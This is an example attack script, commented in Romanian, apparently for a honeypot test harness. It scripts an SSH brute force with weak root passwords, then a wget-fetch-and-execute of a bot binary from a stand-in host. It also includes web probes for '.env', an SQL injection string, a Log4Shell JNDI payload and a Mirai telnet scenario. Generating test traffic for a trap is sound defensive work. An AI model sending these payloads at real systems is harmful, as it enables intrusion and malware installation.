# Exemplu de atac scris de tine.
# Ruleaza-l asa:   python attacker.py --script atac_exemplu.py
#          sau:    python attacker.py --script atac_exemplu.py --real
#
# "Bot" si "mode" vin automat de la attacker.py - nu trebuie sa le imporți.

# un bot care face brute force pe SSH, apoi intra si descarca ceva
bot = Bot("ssh", mode)
bot.login("root", "parola_gresita")        # in sim: gresit; in real: respins de capcana
bot.login("root", "123456")
bot.login("root", "root", success=True)    # in sim reuseste; in real reuseste pt ca e parola slaba
bot.command("uname -a; whoami && id")
bot.command("cd /tmp; wget http://203.0.113.10/bot.arm7; chmod +x bot.arm7; ./bot.arm7",
            "http://203.0.113.10/bot.arm7")
bot.close()

# un scanner web care cauta vulnerabilitati
web = Bot("http", mode)
web.http("/.env")
web.http("/index.php?id=1' or '1'='1")
web.http("/?x=${jndi:ldap://203.0.113.40/a}")
web.close()

# poti folosi si scenariile gata facute
telnet = Bot("telnet", mode)
scenario_mirai(telnet)
telnet.close()
